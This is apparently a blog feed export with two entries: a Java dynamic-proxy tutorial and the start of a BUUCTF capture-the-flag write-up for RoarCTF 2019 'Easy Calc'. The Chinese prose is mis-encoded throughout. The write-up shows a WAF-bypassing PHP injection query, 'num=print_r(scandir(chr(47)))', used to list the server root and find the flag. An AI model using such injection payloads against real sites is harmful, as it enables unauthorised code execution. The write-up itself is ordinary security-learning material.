class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title function_">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span><br>            <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åˆ›å»ºåŠ¨æ€ä»£ç†ç±»å®ä¾‹</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     æŒ‡å®šåŠ¨æ€ä»£ç†ç±»çš„ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces æŒ‡å®šåŠ¨æ€ä»£ç†ç±»çš„ç±»éœ€è¦å®ç°çš„æ¥å£æ•°ç»„ï¼Œè¿™é‡Œçš„å¯¹è±¡æ˜¯æ¥å£å®ç°ç±»</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          åŠ¨æ€ä»£ç†å¤„ç†ç±»</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> è¿”å›åŠ¨æ€ä»£ç†ç”Ÿæˆçš„ä»£ç†ç±»å®ä¾‹</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException ä¸æ­£ç¡®çš„å‚æ•°å¼‚å¸¸</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br>            <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åˆ›å»ºåŠ¨æ€ä»£ç†ç±»</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     å®šä¹‰ä»£ç†ç±»çš„ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces ä»£ç†ç±»è¦å®ç°çš„æ¥å£åˆ—è¡¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ç”¨æŒ‡å®šçš„ç±»åŠ è½½å™¨å®šä¹‰çš„ä»£ç†ç±»ï¼Œå®ƒå¯ä»¥å®ç°æŒ‡å®šçš„æ¥å£</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ£€æµ‹æŸä¸ªç±»æ˜¯å¦æ˜¯åŠ¨æ€ä»£ç†ç±»</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl è¦æµ‹è¯•çš„ç±»</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> å¦‚è¯¥ç±»ä¸ºä»£ç†ç±»ï¼Œåˆ™ä¸º trueï¼Œå¦åˆ™ä¸º false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> &#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å‘æŒ‡å®šçš„ç±»åŠ è½½å™¨ä¸­å®šä¹‰ä¸€ä¸ªç±»å¯¹è±¡</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   ç±»å</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      ç±»å­—èŠ‚ç </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    æˆªå–å¼€å§‹ä½ç½®</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    æˆªå–é•¿åº¦</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVMåˆ›å»ºçš„ç±»Classå¯¹è±¡</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title function_">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨çš„æœ€å¤šçš„å°±æ˜¯<code>newProxyInstance()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">  * åˆ›å»ºåŠ¨æ€ä»£ç†ç±»å®ä¾‹</span><br><span class="hljs-comment">  *</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> loader     æŒ‡å®šåŠ¨æ€ä»£ç†ç±»çš„ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> interfaces æŒ‡å®šåŠ¨æ€ä»£ç†ç±»çš„ç±»éœ€è¦å®ç°çš„æ¥å£æ•°ç»„ï¼Œè¿™é‡Œçš„å¯¹è±¡æ˜¯æ¥å£å®ç°ç±»</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> h          åŠ¨æ€ä»£ç†å¤„ç†ç±»</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@return</span> è¿”å›åŠ¨æ€ä»£ç†ç”Ÿæˆçš„ä»£ç†ç±»å®ä¾‹</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@throws</span> IllegalArgumentException ä¸æ­£ç¡®çš„å‚æ•°å¼‚å¸¸</span><br><span class="hljs-comment">  */</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br>         <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>     ...<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="Invocationhandler"><a href="#Invocationhandler" class="headerlink" title="Invocationhandler"></a>Invocationhandler</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045587.png" alt="QQæˆªå›¾20220225191721"></p><p>å…¶ä¸­å‚æ•°</p><p><code>proxy</code>ï¼šjdkåˆ›å»ºçš„ä»£ç†å¯¹è±¡ï¼Œæ— éœ€èµ‹å€¼</p><p><code>method</code>ï¼šç›®æ ‡ç±»ä¸­çš„æ–¹æ³•</p><p><code>argså‚æ•°</code>ï¼šç›®æ ‡ç±»ä¸­çš„æ–¹æ³•æ‰€æ¥æ”¶çš„å‚æ•°ã€‚<br>å¹¶ä¸”è¿™ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯jdkè‡ªå¸¦çš„ï¼ï¼</p><p>å¦‚ä½•ä½¿ç”¨è¿™ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object demo;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Demo1</span><span class="hljs-params">(Object demo)</span> &#123;<br>        <span class="hljs-built_in">this</span>.demo = demo;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;å¼€å§‹&quot;</span>);<br>       Object res=  method.invoke(demo, args);<br>        System.out.println(<span class="hljs-string">&quot;ç»“æŸ&quot;</span>);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é‡å†™invokeæ–¹æ³•ï¼ŒæŠŠåŸæ¥é™æ€ä»£ç†ä¸­ä»£ç†ç±»è¦å®Œæˆçš„åŠŸèƒ½ï¼Œæ”¾åœ¨é‡å†™ä¹‹åçš„invokeæ–¹æ³•ä¸­å®ç°ã€‚</strong></p><p><strong>invokeæ–¹æ³•è¡¨ç¤ºä»£ç†å¯¹è±¡è¦æ‰§è¡Œçš„åŠŸèƒ½ä»£ç ã€‚</strong></p><h3 id="newProxyInstance"><a href="#newProxyInstance" class="headerlink" title="newProxyInstance"></a>newProxyInstance</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,</span><br><span class="hljs-params">                                          Class&lt;?&gt;[] interfaces,</span><br><span class="hljs-params">                                          InvocationHandler h)</span><br>        <span class="hljs-keyword">throws</span> IllegalArgumentException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (h == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Look up or generate the designated proxy class.</span><br><span class="hljs-comment">         */</span><br>        Class&lt;?&gt; cl = getProxyClass0(loader, interfaces); <span class="hljs-comment">// stack walk magic: do not refactor</span><br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Invoke its constructor with the designated invocation handler.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ih</span> <span class="hljs-operator">=</span> h;<br>            <span class="hljs-type">SecurityManager</span> <span class="hljs-variable">sm</span> <span class="hljs-operator">=</span> System.getSecurityManager();<br>            <span class="hljs-keyword">if</span> (sm != <span class="hljs-literal">null</span> &amp;&amp; ProxyAccessHelper.needsNewInstanceCheck(cl)) &#123;<br>                <span class="hljs-comment">// create proxy instance with doPrivilege as the proxy class may</span><br>                <span class="hljs-comment">// implement non-public interfaces that requires a special permission</span><br>                <span class="hljs-keyword">return</span> AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Object&gt;() &#123;<br>                    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                        <span class="hljs-keyword">return</span> newInstance(cons, ih);<br>                    &#125;<br>                &#125;);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> newInstance(cons, ih);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternalError</span>(e.toString());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å…³é”®å‡½æ•°:<code>Class&lt;?&gt; cl = getProxyClass0(loader, intfs);</code>ä¸»è¦å°±æ˜¯ç”Ÿæˆä»£ç†ç±»ã€‚</p><p>JDKä¼šç”Ÿæˆä¸€ä¸ªå«$Proxy0çš„ä»£ç†ç±»ï¼Œè¿™ä¸ªç±»æ–‡ä»¶æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œåœ¨åˆ›å»ºä»£ç†ç±»å¯¹è±¡æ—¶ï¼Œé€šè¿‡åå°„æœºåˆ¶è·å¾—è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼Œç„¶ååˆ›å»ºä»£ç†ç±»å®ä¾‹ã€‚</p><h3 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h3><h4 id="ä»£ç†ç±»-1"><a href="#ä»£ç†ç±»-1" class="headerlink" title="ä»£ç†ç±»"></a>ä»£ç†ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Company</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object factory;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getFactory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> factory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFactory</span><span class="hljs-params">(Object factory)</span> &#123;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        before();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> method.invoke(factory,args);<br>        after();<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;å¼€å§‹&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;ç»“æŸ&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="hljs-built_in">this</span>);<br>&#125; #è¿™ä¸€æ®µä»£ç å…¶å®å°±æ˜¯ä¸ºäº†åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œå¹¶ä¸”ä¼šæ‰§è¡Œhanderä¸­çš„invokeæ–¹æ³•<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> method.invoke(factory,args);<br>#è¿™ä¸ªå…¶å®å°±æ˜¯ä¸ºäº†å®ç°ä¿®æ”¹çš„éƒ¨åˆ†ï¼Œå…¶ <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;...&#125;ä¼šè¢«<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;...&#125;è§¦å‘<br></code></pre></td></tr></table></figure><h4 id="åˆ›å»ºæ¥å£"><a href="#åˆ›å»ºæ¥å£" class="headerlink" title="åˆ›å»ºæ¥å£"></a>åˆ›å»ºæ¥å£</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AppleShop</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BananerShop</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="å®ç°æ¥å£"><a href="#å®ç°æ¥å£" class="headerlink" title="å®ç°æ¥å£"></a>å®ç°æ¥å£</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleShopReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AppleShop</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åƒè‹¹æœå•¦&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BannerShopReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BananerShop</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åƒé¦™è•‰å•¦&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="å®ç°ç±»-2"><a href="#å®ç°ç±»-2" class="headerlink" title="å®ç°ç±»"></a>å®ç°ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AppleShopReal</span> <span class="hljs-variable">appleShopReal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleShopReal</span>();<br>        <span class="hljs-type">Company</span> <span class="hljs-variable">company</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Company</span>();<br>        company.setFactory(appleShopReal);<br>        <span class="hljs-type">AppleShop</span> <span class="hljs-variable">proxyInstance</span> <span class="hljs-operator">=</span> (AppleShop) company.getProxyInstance();<br>        proxyInstance.Apple();<br><br>        System.out.println(<span class="hljs-string">&quot;-------------------&quot;</span>);<br><br>        <span class="hljs-type">BannerShopReal</span> <span class="hljs-variable">bannerShopReal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BannerShopReal</span>();<br>        company.setFactory(bannerShopReal);<br>        <span class="hljs-type">BananerShop</span> <span class="hljs-variable">proxyInstance1</span> <span class="hljs-operator">=</span> (BananerShop) company.getProxyInstance();<br>        proxyInstance1.Bananer();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åœ¨æˆ‘ç¿»é˜…å¤§ä½¬åšå®¢çš„æ—¶å€™æœ‰å‡ ç‚¹å€¼å¾—æ³¨æ„çš„åœ°æ–¹ã€‚<br> <code>AppleShop proxyInstance = (AppleShop) company.getProxyInstance();</code>å’Œ<code>BananerShop proxyInstance1 = (BananerShop) company.getProxyInstance();</code></p><p><strong>ä¸èƒ½å¼ºè½¬å®ç°ç±»ã€‚</strong>åŸå› ï¼šä¸èƒ½ç”¨æ¥å£çš„å®ç°ç±»æ¥è½¬æ¢Proxyçš„å®ç°ç±»ï¼Œå› ä¸ºä»–ä»¬æ˜¯åŒçº§çš„ï¼ˆä»£ç†ç±»æœ¬èº«ç»§æ‰¿äº†Proxyï¼‰ï¼Œåº”è¯¥ç”¨å…±åŒçš„æ¥å£æ¥è½¬æ¢ã€‚<br>æˆåŠŸã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045630.png" alt="QQæˆªå›¾20220225204149"></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/2022/02/24/BUUCTF/"/>
    <url>/2022/02/24/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><p>æœ‰ç‚¹ä¹±ï¼Œä¹‹å‰åœ¨ç­‰åšå®¢å¼€é€šã€‚</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>é…ç½®äº†å¥½ä¹…çš„å›¾åºŠï¼Œä¹‹å‰ç”¨hexo+githubçš„æœåŠ¡å™¨æ­å»ºåšå®¢ã€‚ç°åœ¨é‡æ–°ç”¨vpsæ­å»ºåšå®¢ï¼Œæ˜¯çœŸçš„éº»çƒ¦ï¼Œè¿˜è¦ç”³è¯·å¤‡æ¡ˆå•¥çš„ã€‚<br>ç»™è‡ªå·±å–äº†ä¸€ä¸ªå¥½å¬çš„idåâ€”-Xsw6_aï¼Œä½†æ˜¯å¾ˆéš¾å—ï¼Œå› ä¸ºå¾ˆå¤šæ—¶å€™ä¸‹åˆ’çº¿(_)ï¼Œæ˜¯éæ³•å­—ç¬¦ã€‚<br>å…ˆæ¥åšåšè¿™ä¸ªæ¯”è¾ƒç®€å•çš„é¢˜å˜¿å˜¿ã€‚<br>emmmåˆè¦é‡æ–°å¯åŠ¨ä¸€ä¸‹ç¯å¢ƒã€‚<br>å…ˆæ¥çœ‹çœ‹æºä»£ç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214131745.png" alt="QQæˆªå›¾20220214131745"></p><p>å€¼å¾—æ³¨æ„çš„å‡ ç‚¹ã€‚<br><strong>1.Iâ€™ve set up WAF to ensure security.</strong></p><p><strong>2.calc.php</strong></p><p>è¿›å…¥é“¾æ¥ï¼š<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a></p><p>è¯»å–ä»£ç ï¼š<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214132112.png" alt="QQæˆªå›¾20220214132112"></p><p>è¿™é‡Œå¯¹æˆ‘æ¥è¯´çš„æ–°çŸ¥è¯†ï¼Œäº†è§£ä¸€ä¸‹foreachå‡½æ•°ã€‚ï¼ˆèœé¸Ÿæ•™ç¨‹ï¼‰<br>æ­£åˆ™è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ã€‚<br>æ„é€ num&#x3D;print_r(scandir(chr(47))),å‘ç°æŠ¥é”™ã€‚<br>emmmâ€¦.ä¸ä¼šäº†ã€‚ç™¾åº¦ã€‚<br>åªéœ€è¦å°†numä¹‹å‰æ‰“ä¸€ä¸ªç©ºæ ¼ã€‚<br>æ–°é“¾æ¥ï¼š<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a>? num&#x3D;print_r(scandir(chr(47)))<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214133023.png" alt="QQæˆªå›¾20220214133023"></p><p>è¯»å–f1aggã€‚<br>è¿™é‡Œé™„ä¸Šå­—ç¬¦ä¸²è½¬asciiçš„javaä»£ç ï¼Œå°±å½“å¤ä¹ javaåŸºç¡€è¯­æ³•äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/f1agg&quot;</span>;<br>        <span 